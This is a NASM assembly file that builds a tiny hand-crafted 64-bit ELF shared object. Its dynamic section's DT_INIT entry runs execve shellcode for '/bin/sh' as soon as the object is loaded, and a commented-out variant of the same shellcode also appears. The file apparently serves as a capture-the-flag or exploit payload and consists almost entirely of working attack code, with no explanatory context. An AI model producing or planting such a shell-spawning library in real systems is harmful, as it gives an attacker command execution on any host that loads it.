BITS 64

ehdr:                                               ; Elf32_Ehdr
            db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
    times 8 db      0
            dw      3                               ;   e_type
            dw      0x3E                            ;   e_machine
            dd      1                               ;   e_version
            ;; dq      0                               ;   e_entry
            ;; dq      program_headers - $$            ;   e_phoff
            ;; dq      phdyn - $$            ;   e_phoff
            ;; dq      0                               ;   e_shoff TODO
            ;; dd      0                               ;   e_flags
            ;; dw      ehdrsize                        ;   e_ehsize
            ;; dw      phdrsize                        ;   e_phentsize
phdyn:  
    dd      2                       ; p_type (PT_DYNAMIC)
    dd      7                      ; p_flags
    dq      phdyn - $$                      ; p_offset
    dq      dynamic_section         ; p_vaddr
    dq      0x0038414141410002         ; p_paddr
    dq      0x4141414141410002 ; p_filesz
    ;; dq      0x4141414141414141     ; p_memsz
    dq 0x68732f6e69622f
    dq      0x1000                  ; p_align
            ;; dw      2                               ;   e_phnum
            ;; dw      0                               ;   e_shentsize
            ;; dw      0                               ;   e_shnum
            ;; dw      0                               ;   e_shstrndx

ehdrsize      equ     $ - ehdr

program_headers:
    dd      1                       ; p_type (PT_LOAD)
    dd      7                       ; p_flags
    dq      INIT                    ; p_offset
    dq      INIT                    ; p_vaddr
    ;; dq      0                   ; p_paddr
    ;; dq      0                ; p_filesz
    ;; dq      0                ; p_memsz
    ;; dq      0x1000                  ; p_align

INIT:
    ; INF LOOP
    ; db 0xeb
    ; db 0xfe

    ; SHELL
    lea rdi, [rel binsh]
    ;; mov rdi, 0x68732f6e69622f
    push   rdi
    push   rsp
    pop    rdi

    push  0
    push  rdi
    push  rsp
    pop   rsi

    push 0x3b
    pop rax
    cdq
	syscall

    db 0
    db 1
    db 0
    db 0
    db 0x10
    db 0
    db 0
    db 0
    db 0
    db 0
    db 0

binsh:
    dq 0x68732f6e69622f

; This is like the .dynamic section
DYN_STRTAB:
DYN_SYMTAB:
dynamic_section:    ; _DYNAMIC[]
    dq 12           ; DT_INIT
    dq INIT

    dq 5            ; DT_STRTAB	5		/* Address of string table */
    dq DYN_STRTAB

    dq 10           ; DT_STRSZ	10		/* Size of string table */
    dq 1

    dq 6            ; DT_SYMTAB	6		/* Address of symbol table */
    dq DYN_SYMTAB


dynamic_section_len     equ     $-dynamic_section


;; INIT:
;;     ; INF LOOP
;;     ; db 0xeb
;;     ; db 0xfe

;;     ; SHELL
;;     xor    rsi,rsi
;;     push   rsi
;;     ;; lea rdi, [rel binsh]
;;     mov rdi, 0x68732f6e69622f
;;     push   rdi
;;     push   rsp
;;     pop    rdi

;;     push  0
;;     push  rdi
;;     push  rsp
;;     pop   rsi

;;     push 0x3b
;;     pop rax
;;     cdq
;; 	syscall


;; INIT_len    equ     $-INIT


    ; times 24 db 0x41

filesize      equ     $ - $$
